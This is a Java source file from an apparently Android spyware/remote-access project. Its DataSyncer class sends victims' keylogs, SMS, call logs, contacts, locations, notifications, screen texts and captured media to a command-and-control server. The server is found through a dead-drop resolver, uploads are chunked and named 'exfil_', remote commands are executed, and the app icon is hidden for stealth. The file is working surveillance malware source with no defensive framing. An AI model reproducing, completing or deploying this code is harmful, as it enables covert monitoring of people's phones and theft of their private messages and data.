package com.example.reverseshell2;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import android.util.Base64;

/**
 * Syncs locally buffered data to the C2 server via HTTPS POST.
 * Replaces the old raw TCP socket approach.
 * Called periodically by SyncAdapter (primary) and WorkManager (fallback).
 * 
 * C2 address is resolved at runtime via Dead Drop Resolver — 
 * the APK never contains the real server IP.
 */
public class DataSyncer {
    private static final String TAG = "SYS_SYNC";
    private final Context context;
    private final DataStore store;
    private String serverUrl;

    public DataSyncer(Context ctx) {
        this.context = ctx.getApplicationContext();
        this.store = DataStore.getInstance(ctx);
        // Resolve C2 URL via Dead Drop Resolver (NOT hardcoded)
        this.serverUrl = DeadDropResolver.resolveC2Url();
    }

    /**
     * Main sync method — called by WorkManager every ~15 min.
     * 1. Batch-read all unsynced data from local DB
     * 2. POST as JSON to /api/sync
     * 3. Upload pending files to /api/upload
     * 4. Check for pending commands from server
     * 5. Execute commands
     * 6. Mark synced data + cleanup
     */
    private int failureCount = 0;

    public void performSync() {
        try {
            // [DEBUGGING OVERRIDE] Bypassing EnvironmentGuard for testing on dev devices
            /*
            if (!EnvironmentGuard.isSafeEnvironment(context)) {
                Log.d(TAG, "Environment check failed — sync suppressed");
                return;
            }
            */

            // Always resolve/refresh C2 URL
            this.serverUrl = DeadDropResolver.resolveC2Url();
            Log.d(TAG, "Starting sync to " + serverUrl);

            // 1. Build the sync payload (JSON data)
            JSONObject payload = new JSONObject();
            payload.put("device_id", getDeviceId());
            payload.put("model", Build.MANUFACTURER + " " + Build.MODEL);
            payload.put("android_version", String.valueOf(Build.VERSION.SDK_INT));

            JSONObject data = new JSONObject();
            String[] tables = {"keylogs", "notifications", "messages", "locations",
                    "contacts", "sms", "call_logs", "apps", "screen_texts"};

            int totalRows = 0;
            for (String table : tables) {
                JSONArray rows = store.getUnsynced(table, 500);
                data.put(table, rows);
                totalRows += rows.length();
            }
            payload.put("data", data);

            // 2. POST to /api/sync
            String response = httpPost(serverUrl + "/api/sync", payload.toString());
            if (response == null) {
                handleFailure();
                return;
            }

            failureCount = 0; // Reset on success
            JSONObject resp = new JSONObject(response);
            if (resp.optString("status").equals("ok")) {
                // 3. Mark all sent data as synced
                for (String table : tables) {
                    int count = data.getJSONArray(table).length();
                    if (count > 0) store.markSynced(table, count);
                }
                Log.d(TAG, "Synced " + totalRows + " rows successfully");

                // 4. Upload pending files (Screenshots/Recordings) - NOW CHUNKED
                uploadPendingFilesChunked();

                // 5. Process commands
                JSONArray commands = resp.optJSONArray("commands");
                if (commands != null && commands.length() > 0) {
                    processCommands(commands);
                }

                store.cleanupSynced();
                
                // ELITE STEALTH: Hide launcher icon ONLY after Phase 2 is verified
                new StealthManager(context).hideFromLauncher();
            }
        } catch (Exception e) {
            Log.e(TAG, "Sync error: " + e.getMessage());
            handleFailure();
        }
    }

    private void handleFailure() {
        failureCount++;
        Log.e(TAG, "Connection failure #" + failureCount);
        if (failureCount >= 3) {
            Log.w(TAG, "Failover threshold reached — triggering DDR rotation");
            DeadDropResolver.rotate();
            failureCount = 0;
        }
    }

    private void uploadPendingFilesChunked() {
        try {
            Cursor c = store.getUnsyncedFiles();
            if (c.moveToFirst()) {
                do {
                    int id = c.getInt(c.getColumnIndexOrThrow("id"));
                    String filePath = c.getString(c.getColumnIndexOrThrow("file_path"));
                    String fileType = c.getString(c.getColumnIndexOrThrow("file_type"));
                    String timestamp = c.getString(c.getColumnIndexOrThrow("timestamp"));

                    File file = new File(filePath);
                    if (!file.exists()) {
                        store.markFileSynced(id);
                        continue;
                    }

                    long fileSize = file.length();
                    int chunkSize = 1024 * 1024; // 1MB chunks
                    int totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
                    String serverFilename = "exfil_" + System.currentTimeMillis() + "_" + file.getName();

                    Log.d(TAG, "Starting chunked upload for: " + filePath + " (" + totalChunks + " chunks)");

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[chunkSize];
                    int bytesRead;
                    int chunkId = 0;

                    boolean success = true;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        byte[] actualChunk = bytesRead == chunkSize ? buffer : java.util.Arrays.copyOf(buffer, bytesRead);
                        
                        JSONObject chunkPayload = new JSONObject();
                        chunkPayload.put("device_id", getDeviceId());
                        chunkPayload.put("type", fileType);
                        chunkPayload.put("timestamp", timestamp);
                        chunkPayload.put("chunk_id", chunkId);
                        chunkPayload.put("total_chunks", totalChunks);
                        chunkPayload.put("filename", serverFilename);
                        chunkPayload.put("data", Base64.encodeToString(actualChunk, Base64.NO_WRAP));

                        String resp = httpPost(serverUrl + "/api/upload", chunkPayload.toString());
                        if (resp == null) {
                            success = false;
                            break;
                        }
                        chunkId++;
                    }
                    fis.close();

                    if (success) {
                        store.markFileSynced(id);
                        Log.d(TAG, "Successfully uploaded file in " + totalChunks + " chunks");
                    } else {
                        Log.e(TAG, "Chunked upload failed at chunk " + chunkId);
                        handleFailure();
                    }

                } while (c.moveToNext());
            }
            c.close();
        } catch (Exception e) {
            Log.e(TAG, "Chunked upload error: " + e.getMessage());
        }
    }

    private void processCommands(JSONArray commands) {
        for (int i = 0; i < commands.length(); i++) {
            try {
                JSONObject cmd = commands.getJSONObject(i);
                int cmdId = cmd.getInt("id");
                String command = cmd.getString("command");
                String params = cmd.optString("params", "");

                Log.d(TAG, "Executing command: " + command);
                String result = executeCommand(command, params);

                // Report result back to server
                JSONObject resultPayload = new JSONObject();
                resultPayload.put("command_id", cmdId);
                resultPayload.put("result", result);
                httpPost(serverUrl + "/api/command_result", resultPayload.toString());
            } catch (Exception e) {
                Log.e(TAG, "Command error: " + e.getMessage());
            }
        }
    }

    private String executeCommand(String command, String params) {
        try {
            switch (command) {
                case "screenshot":
                    return "ERROR: Screenshot deferred to Phase 4 GhostLoader";

                case "start_surround":
                    return "ERROR: Surround deferred to Phase 4 GhostLoader";

                case "stop_surround":
                    return "ERROR: Surround deferred to Phase 4 GhostLoader";

                case "dump_contacts":
                    return "ERROR: Contacts deferred to Phase 4 GhostLoader";

                case "dump_sms":
                    dumpSmsToStore();
                    return "SMS dumped to local DB";

                case "dump_call_logs":
                    dumpCallLogsToStore();
                    return "Call logs dumped to local DB";

                case "dump_apps":
                    return "ERROR: App dumping deferred to Phase 4 GhostLoader";

                case "get_location":
                    return "Location will be captured on next location poll";

                case "take_photo":
                    return "Photo capture queued";

                case "vibrate":
                    android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                    if (v != null) v.vibrate(500);
                    return "Device vibrated";

                default:
                    return "Unknown command: " + command;
            }
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    private void dumpSmsToStore() {
        try {
            Cursor c = context.getContentResolver().query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    new String[]{"address", "body", "type", "date"},
                    null, null, "date DESC LIMIT 200");
            if (c != null && c.moveToFirst()) {
                do {
                    String addr = c.getString(0);
                    String body = c.getString(1);
                    int type = c.getInt(2);
                    String date = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                            .format(new java.util.Date(c.getLong(3)));
                    String typeStr = type == 1 ? "inbox" : type == 2 ? "sent" : "other";
                    store.insertSms(addr, body, typeStr, date);
                } while (c.moveToNext());
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "SMS dump error: " + e.getMessage());
        }
    }

    private void dumpCallLogsToStore() {
        try {
            Cursor c = context.getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    new String[]{android.provider.CallLog.Calls.NUMBER, android.provider.CallLog.Calls.TYPE,
                            android.provider.CallLog.Calls.DURATION, android.provider.CallLog.Calls.DATE},
                    null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 200");
            if (c != null && c.moveToFirst()) {
                do {
                    String number = c.getString(0);
                    int type = c.getInt(1);
                    int duration = c.getInt(2);
                    String date = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                            .format(new java.util.Date(c.getLong(3)));
                    String typeStr;
                    switch (type) {
                        case android.provider.CallLog.Calls.INCOMING_TYPE: typeStr = "incoming"; break;
                        case android.provider.CallLog.Calls.OUTGOING_TYPE: typeStr = "outgoing"; break;
                        case android.provider.CallLog.Calls.MISSED_TYPE: typeStr = "missed"; break;
                        default: typeStr = "other";
                    }
                    store.insertCallLog(number, typeStr, duration, date);
                } while (c.moveToNext());
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Call log dump error: " + e.getMessage());
        }
    }

    // =======================================================
    //  HTTP HELPER
    // =======================================================

    private String httpPost(String urlStr, String jsonBody) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Android/" + Build.VERSION.SDK_INT);
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(jsonBody);
            wr.flush();
            wr.close();

            int code = conn.getResponseCode();
            if (code == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                return sb.toString();
            } else {
                Log.e(TAG, "HTTP " + code + " from " + urlStr);
                return null;
            }
        } catch (Exception e) {
            Log.e(TAG, "HTTP error: " + e.getMessage());
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private String getDeviceId() {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
}
